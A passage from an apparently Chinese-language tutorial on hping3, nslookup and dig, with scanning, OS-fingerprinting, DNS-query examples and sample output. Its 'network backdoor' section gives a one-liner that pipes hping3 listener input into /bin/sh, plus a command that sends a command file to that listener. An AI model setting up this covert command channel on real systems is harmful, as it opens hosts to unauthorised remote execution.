<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -c <span class="m">5</span> -V -1 -C <span class="m">17</span> 110.242.68.4 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">using eth0, addr: 10.0.0.4, MTU: <span class="m">1500</span>
</span></span><span class="line"><span class="cl">HPING 110.242.68.4 <span class="o">(</span>eth0 110.242.68.4<span class="o">)</span>: icmp mode set, <span class="m">28</span> headers + <span class="m">0</span> data bytes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--- 110.242.68.4 hping statistic ---
</span></span><span class="line"><span class="cl"><span class="m">5</span> packets transmitted, <span class="m">0</span> packets received, 100% packet loss
</span></span><span class="line"><span class="cl">round-trip min/avg/max <span class="o">=</span> 0.0/0.0/0.0 ms
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过hping3进行TCP FIN扫描</p>
<p>在TCP连接中，FIN标志用于开始请求关闭连接。万一没有得到答复，那说明端口是开放的。通常防火墙会再次发送Rst+ack数据包，以指示该端口已关闭。</p>
<h3 id="通过hping3-进行ack扫描">通过hping3 进行ACK扫描</h3>
<p>有些情况下，主机可能禁止PING ICMP，此时使用ACK扫描可以用于检查主机是否处于活动状态。如果主机活跃，会相应RST标记，在hping中是为 <code>flags=R</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -c <span class="m">2</span> -V -p <span class="m">80</span> -A 110.242.68.4 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">using eth0, addr: 10.0.0.4, MTU: <span class="m">1500</span>
</span></span><span class="line"><span class="cl">HPING 110.242.68.4 <span class="o">(</span>eth0 110.242.68.4<span class="o">)</span>: A set, <span class="m">40</span> headers + <span class="m">0</span> data bytes
</span></span><span class="line"><span class="cl"><span class="nv">len</span><span class="o">=</span><span class="m">46</span> <span class="nv">ip</span><span class="o">=</span>110.242.68.4 <span class="nv">ttl</span><span class="o">=</span><span class="m">128</span> <span class="nv">id</span><span class="o">=</span><span class="m">2391</span> <span class="nv">tos</span><span class="o">=</span><span class="m">0</span> <span class="nv">iplen</span><span class="o">=</span><span class="m">40</span>
</span></span><span class="line"><span class="cl"><span class="nv">sport</span><span class="o">=</span><span class="m">80</span> <span class="nv">flags</span><span class="o">=</span>R <span class="nv">seq</span><span class="o">=</span><span class="m">0</span> <span class="nv">win</span><span class="o">=</span><span class="m">32767</span> <span class="nv">rtt</span><span class="o">=</span>0.6 ms
</span></span><span class="line"><span class="cl"><span class="nv">seq</span><span class="o">=</span><span class="m">1165126080</span> <span class="nv">ack</span><span class="o">=</span><span class="m">0</span> <span class="nv">sum</span><span class="o">=</span>c0ba <span class="nv">urp</span><span class="o">=</span><span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="udp扫描">UDP扫描</h3>
<p>使用参数 <code>-2</code> 可以让hping工作于UDP模式，可以进行UDP扫描</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -2 8.8.4.4 -V -p <span class="m">53</span> -c <span class="m">10</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="操作系统识别">操作系统识别</h3>
<p>使用-Q或-seqnum可以让<code>hping</code> 收集了ISN。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 127.0.0.1 -Q -p <span class="m">22</span> -V -S
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">using lo, addr: 127.0.0.1, MTU: <span class="m">65536</span>
</span></span><span class="line"><span class="cl">HPING 127.0.0.1 <span class="o">(</span>lo 127.0.0.1<span class="o">)</span>: S set, <span class="m">40</span> headers + <span class="m">0</span> data bytes
</span></span><span class="line"><span class="cl"> <span class="m">893247485</span> +893247485
</span></span><span class="line"><span class="cl"><span class="m">2568100167</span> +1674852682
</span></span><span class="line"><span class="cl"><span class="m">2600543427</span> +32443260
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="内容探测">内容探测</h3>
<p>可以使用hping的监听模式，来抓取通过网络接口的所有流量，以及捕获对应的内容。例如抓取通过谷歌搜索的流量包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -9 <span class="s2">&#34;www.google.com&#34;</span> --beep -I eth0hping2 listen mode<span class="o">[</span>main<span class="o">]</span> memlockall<span class="o">()</span>: SuccessWarning: can<span class="err">&#39;</span>t disable memory paging!Accept: */*.hk/url?sa<span class="o">=</span>p<span class="p">&amp;</span><span class="nv">hl</span><span class="o">=</span>zh-CN<span class="p">&amp;</span><span class="nv">pref</span><span class="o">=</span>hkredirect<span class="p">&amp;</span><span class="nv">pval</span><span class="o">=</span>yes<span class="p">&amp;</span><span class="nv">q</span><span class="o">=</span>http://www.google.com.hk/<span class="p">&amp;</span><span class="nv">ust</span><span class="o">=</span>1624605433464983<span class="p">&amp;</span><span class="nv">usg</span><span class="o">=</span>AOvVaw2THxd5w15lxgX3_KA19GWLCache-Control: privateContent-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8P3P: <span class="nv">CP</span><span class="o">=</span><span class="s2">&#34;This is not a P3P policy! See g.co/p3phelp for more info.&#34;</span>Date: Fri, <span class="m">25</span> Jun <span class="m">2021</span> 07:16:43 GMTServer: gwsContent-Length: 370X-XSS-Protection: 0X-Frame-Options: SAMEORIGINSet-Cookie: <span class="nv">1P_JAR</span><span class="o">=</span>2021-06-25-07<span class="p">;</span> <span class="nv">expires</span><span class="o">=</span>Sun, 25-Jul-2021 07:16:43 GMT<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">domain</span><span class="o">=</span>.google.com<span class="p">;</span> SecureSet-Cookie: <span class="nv">NID</span><span class="o">=</span><span class="nv">217</span><span class="o">=</span>PdQLBtU-tTavgvb4BW9ouB3nAr1OKNK6I_kn9u2Qa2eTgLA_qLyGv2G_2t2G_PRNVrKu2SOEm-e7ED17ljnx3uFBweBjQWOyRvHrJ6jhC5_J3yaBK0r8mikUrqHNjDez5F3rCleFQDurBEfnqECDFXNkvvO_-Wn4ahGJeid01TM<span class="p">;</span> <span class="nv">expires</span><span class="o">=</span>Sat, 25-Dec-2021 07:16:43 GMT<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">domain</span><span class="o">=</span>.google.com<span class="p">;</span> HttpOnly&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;content-type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html;charset=utf-8&#34;</span>&gt;&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;302 Moved&lt;/H1&gt;The document has moved&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.google.com.hk/url?sa=p&amp;amp;hl=zh-CN&amp;amp;pref=hkredirect&amp;amp;pval=yes&amp;amp;q=http://www.google.com.hk/&amp;amp;ust=1624605433464983&amp;amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL&#34;</span>&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;.hk/<span class="p">&amp;</span><span class="nv">ust</span><span class="o">=</span>1624605433464983<span class="p">&amp;</span><span class="nv">usg</span><span class="o">=</span>AOvVaw2THxd5w15lxgX3_KA19GWL HTTP/1.1User-Agent: curl/7.29.0Host: www.google.com.hkAccept: */*.hk/Cache-Control: privateContent-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8P3P: <span class="nv">CP</span><span class="o">=</span><span class="s2">&#34;This is not a P3P policy! See g.co/p3phelp for more info.&#34;</span>Date: Fri, <span class="m">25</span> Jun <span class="m">2021</span> 07:16:43 GMTServer: gwsContent-Length: 222X-XSS-Protection: 0Set-Cookie: <span class="nv">1P_JAR</span><span class="o">=</span>2021-06-25-07<span class="p">;</span> e
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="网络后门">网络后门</h3>
<p>可以通过hping3的监听模式，创建一个简单的后门(backdoor)，通过管道来执行脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hping3 -I eth1 -9 secret <span class="p">|</span> /bin/shhping3 -R 192.168.1.100 -e secret -E commands_file -d <span class="m">100</span> -c <span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nslookup">nslookup</h2>
<p><em><strong>nslookup</strong></em>（name server lookup）用于在Linux中执行DNS查找的工具。用于显示DNS详细信息，例如计算机的IP地址、域的MX记录或域的NS服务器。</p>
<p>nslookup 可以在两种模式下运行：交互式和非交互式。交互模式可以查询名称服务器以获取有关各种主机和域的信息或打印域中的主机列表。非交互模式仅打印主机或域的名称和请求的信息。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>knot-dnsutils</code>  ；<code>apt install knot-dnsutils</code></li>
<li>CentOS/Fedora: <code>bind-utils</code> | <code>dnsutils</code> ；<code>yum install -y bind-utils</code></li>
<li>Apline：<code>bind-tools </code> ；<code>apk add bind-tools</code></li>
</ul>
</blockquote>
<h3 id="简单查询">简单查询</h3>
<p>nslookup后跟域名将显示域名的“A记录”（IP地址）,nslookup命令的默认输出比dig命令的默认输出相对整洁些。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup redhat.com
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行反向DNS查找：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup 208.117.229.88
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查询mx记录">查询MX记录</h3>
<p>MX（ Mail Exchange ）记录将域名映射到该域的邮件服务器列表。MX记录表明发到 <code>@qq.com</code> 的所有邮件都应该路由到该域中的邮件服务器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -query<span class="o">=</span>mx qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Server:         183.60.83.19
</span></span><span class="line"><span class="cl">Address:        183.60.83.19#53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Non-authoritative answer:
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">20</span> mx2.qq.com.
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">30</span> mx1.qq.com.
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">10</span> mx3.qq.com.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authoritative answers can be found from:
</span></span></code></pre></td></tr></table>
</div>
</div><p>Authoritative Answer与Non-Authoritative Answer</p>
<p>可以注意到注意到上面输出中的关键字 <code>Authoritative</code> 和 <code>Non-Authoritative Answer</code>。任何来自DNS服务器的答复都称为<code>Authoritative Answer</code>，该服务器具有域可用的完整区域文件信息。在许多情况下，DNS服务器将不具备给定域的完整区域文件信息。相反，它维护一个缓存文件，该文件包含过去执行的所有查询的结果，并已获得权威响应。当给出一个DNS查询时，它搜索缓存文件，并以 <code>Non-Authoritative Answer</code> 的形式返回可用的信息。</p>
<h3 id="查询ns记录">查询NS记录</h3>
<p>NS ( Name Server ) 记录将域名映射到该域的授权DNS服务器列表。它将输出与给定域关联的名称服务。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -type<span class="o">=</span>ns qq.comServer:         183.60.83.19Address:        183.60.83.19#53Non-authoritative answer:qq.com  <span class="nv">nameserver</span> <span class="o">=</span> ns1.qq.com.qq.com  <span class="nv">nameserver</span> <span class="o">=</span> ns2.qq.com.qq.com  <span class="nv">nameserver</span> <span class="o">=</span> ns3.qq.com.qq.com  <span class="nv">nameserver</span> <span class="o">=</span> ns4.qq.com.Authoritative answers can be found from:
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查询soa记录">查询SOA记录</h3>
<p>SOA ( start of authority )记录\，提供关于域的权威信息、域管理员的电子邮件地址、域序列号等。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -type<span class="o">=</span>soa qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Server:         183.60.83.19
</span></span><span class="line"><span class="cl">Address:        183.60.83.19#53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Non-authoritative answer:
</span></span><span class="line"><span class="cl">qq.com
</span></span><span class="line"><span class="cl">        <span class="nv">origin</span> <span class="o">=</span> ns1.qq.com
</span></span><span class="line"><span class="cl">        mail <span class="nv">addr</span> <span class="o">=</span> webmaster.qq.com
</span></span><span class="line"><span class="cl">        <span class="nv">serial</span> <span class="o">=</span> <span class="m">1330914143</span>
</span></span><span class="line"><span class="cl">        <span class="nv">refresh</span> <span class="o">=</span> <span class="m">3600</span>
</span></span><span class="line"><span class="cl">        <span class="nv">retry</span> <span class="o">=</span> <span class="m">300</span>
</span></span><span class="line"><span class="cl">        <span class="nv">expire</span> <span class="o">=</span> <span class="m">86400</span>
</span></span><span class="line"><span class="cl">        <span class="nv">minimum</span> <span class="o">=</span> <span class="m">300</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authoritative answers can be found from:
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>mail addr–指定域管理员的邮件地址</li>
<li>serial 一种版本编号系统。标准惯例是使用 <code>YYYYMMYNN</code> 格式 <code>2012-07-16.01</code>如果在同一天进行了多个编辑，则将递增）</li>
<li>refresh 指定从DNS服务何时轮询主DNS以查看序列号是否已增加（以秒为单位）。如果增加，从DNS服务器将发出复制新区域文件的新请求。</li>
<li>retry 指定与主DNS重新连接的间隔</li>
<li>expire 指定辅助DNS保持缓存区域文件有效的时间</li>
<li>minimum 指定从DNS应缓存区域文件的时间</li>
</ul>
<h3 id="查看可用的dns记录">查看可用的DNS记录</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -type<span class="o">=</span>any qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Server:         183.60.83.19
</span></span><span class="line"><span class="cl">Address:        183.60.83.19#53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Non-authoritative answer:
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 61.129.7.47
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 183.3.226.35
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 203.205.254.157
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 123.151.137.18
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">10</span> mx3.qq.com.
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">20</span> mx2.qq.com.
</span></span><span class="line"><span class="cl">qq.com  mail <span class="nv">exchanger</span> <span class="o">=</span> <span class="m">30</span> mx1.qq.com.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authoritative answers can be found from:
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用指定dns查询">使用指定DNS查询</h3>
<p>可以指定特定的DNS来解析域名，而不是使用默认DNS进行查询。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup www.qq.com 8.8.8.8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Server:         8.8.8.8
</span></span><span class="line"><span class="cl">Address:        8.8.8.8#53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Non-authoritative answer:
</span></span><span class="line"><span class="cl">www.qq.com      canonical <span class="nv">name</span> <span class="o">=</span> news.qq.com.edgekey.net.
</span></span><span class="line"><span class="cl">news.qq.com.edgekey.net canonical <span class="nv">name</span> <span class="o">=</span> e6156.dscf.akamaiedge.net.
</span></span><span class="line"><span class="cl">Name:   e6156.dscf.akamaiedge.net
</span></span><span class="line"><span class="cl">Address: 23.219.132.75
</span></span><span class="line"><span class="cl">Name:   e6156.dscf.akamaiedge.net
</span></span><span class="line"><span class="cl">Address: 2600:1417:76:494::180c
</span></span><span class="line"><span class="cl">Name:   e6156.dscf.akamaiedge.net
</span></span><span class="line"><span class="cl">Address: 2600:1417:76:480::180c
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用特殊的dns端口">使用特殊的dns端口</h3>
<p>默认情况下，DNS使用端口号为53。可以使用-port选项指定端口号。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -port <span class="m">56</span> qq.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置超时时间">设置超时时间</h3>
<p>可以使用 <code>-timeout</code> 选项来指定超时时间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -timeout<span class="o">=</span><span class="m">10</span> qq.com
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="启用调试模式">启用调试模式</h3>
<p><code>-debug</code> 选项打开/关闭调试</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nslookup -debug qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Server:         183.60.83.19
</span></span><span class="line"><span class="cl">Address:        183.60.83.19#53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------------
</span></span><span class="line"><span class="cl">    QUESTIONS:
</span></span><span class="line"><span class="cl">        qq.com, <span class="nb">type</span> <span class="o">=</span> A, <span class="nv">class</span> <span class="o">=</span> IN
</span></span><span class="line"><span class="cl">    ANSWERS:
</span></span><span class="line"><span class="cl">    -&gt;  qq.com
</span></span><span class="line"><span class="cl">        internet <span class="nv">address</span> <span class="o">=</span> 183.3.226.35
</span></span><span class="line"><span class="cl">        <span class="nv">ttl</span> <span class="o">=</span> <span class="m">92</span>
</span></span><span class="line"><span class="cl">    -&gt;  qq.com
</span></span><span class="line"><span class="cl">        internet <span class="nv">address</span> <span class="o">=</span> 203.205.254.157
</span></span><span class="line"><span class="cl">        <span class="nv">ttl</span> <span class="o">=</span> <span class="m">92</span>
</span></span><span class="line"><span class="cl">    -&gt;  qq.com
</span></span><span class="line"><span class="cl">        internet <span class="nv">address</span> <span class="o">=</span> 61.129.7.47
</span></span><span class="line"><span class="cl">        <span class="nv">ttl</span> <span class="o">=</span> <span class="m">92</span>
</span></span><span class="line"><span class="cl">    -&gt;  qq.com
</span></span><span class="line"><span class="cl">        internet <span class="nv">address</span> <span class="o">=</span> 123.151.137.18
</span></span><span class="line"><span class="cl">        <span class="nv">ttl</span> <span class="o">=</span> <span class="m">92</span>
</span></span><span class="line"><span class="cl">    AUTHORITY RECORDS:
</span></span><span class="line"><span class="cl">    ADDITIONAL RECORDS:
</span></span><span class="line"><span class="cl">------------
</span></span><span class="line"><span class="cl">Non-authoritative answer:
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 183.3.226.35
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 203.205.254.157
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 61.129.7.47
</span></span><span class="line"><span class="cl">Name:   qq.com
</span></span><span class="line"><span class="cl">Address: 123.151.137.18
</span></span><span class="line"><span class="cl">------------
</span></span><span class="line"><span class="cl">    QUESTIONS:
</span></span><span class="line"><span class="cl">        qq.com, <span class="nb">type</span> <span class="o">=</span> AAAA, <span class="nv">class</span> <span class="o">=</span> IN
</span></span><span class="line"><span class="cl">    ANSWERS:
</span></span><span class="line"><span class="cl">    AUTHORITY RECORDS:
</span></span><span class="line"><span class="cl">    -&gt;  qq.com
</span></span><span class="line"><span class="cl">        <span class="nv">origin</span> <span class="o">=</span> ns1.qq.com
</span></span><span class="line"><span class="cl">        mail <span class="nv">addr</span> <span class="o">=</span> webmaster.qq.com
</span></span><span class="line"><span class="cl">        <span class="nv">serial</span> <span class="o">=</span> <span class="m">1330914143</span>
</span></span><span class="line"><span class="cl">        <span class="nv">refresh</span> <span class="o">=</span> <span class="m">3600</span>
</span></span><span class="line"><span class="cl">        <span class="nv">retry</span> <span class="o">=</span> <span class="m">300</span>
</span></span><span class="line"><span class="cl">        <span class="nv">expire</span> <span class="o">=</span> <span class="m">86400</span>
</span></span><span class="line"><span class="cl">        <span class="nv">minimum</span> <span class="o">=</span> <span class="m">300</span>
</span></span><span class="line"><span class="cl">        <span class="nv">ttl</span> <span class="o">=</span> <span class="m">296</span>
</span></span><span class="line"><span class="cl">    ADDITIONAL RECORDS:
</span></span><span class="line"><span class="cl">------------
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dig">dig</h3>
<p><em><strong>dig</strong></em>（Domain Information Groper) 执行DNS查找。默认情况下，dig查询通过 resolver ( <code>/etc/resolv.conf</code> ) 中列出的DNS地址，除非指定特定的name server。</p>
<h3 id="语法">语法</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig @server name <span class="nb">type</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="解析ip地址">解析IP地址</h3>
<p><code>dig</code> 通常不带参数地用于获取提供的DNS名称的IP地址。默认使用系统提供的DNS服务器用于DNS解析。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig www.qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.3 &lt;&lt;&gt;&gt; www.qq.com
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">40004</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr rd ra<span class="p">;</span> QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>www.qq.com.                    IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">www.qq.com.             <span class="m">132</span>     IN      CNAME   ins-r23tsuuf.ias.tencent-cloud.net.
</span></span><span class="line"><span class="cl">ins-r23tsuuf.ias.tencent-cloud.net. <span class="m">60</span> IN A     109.244.236.76
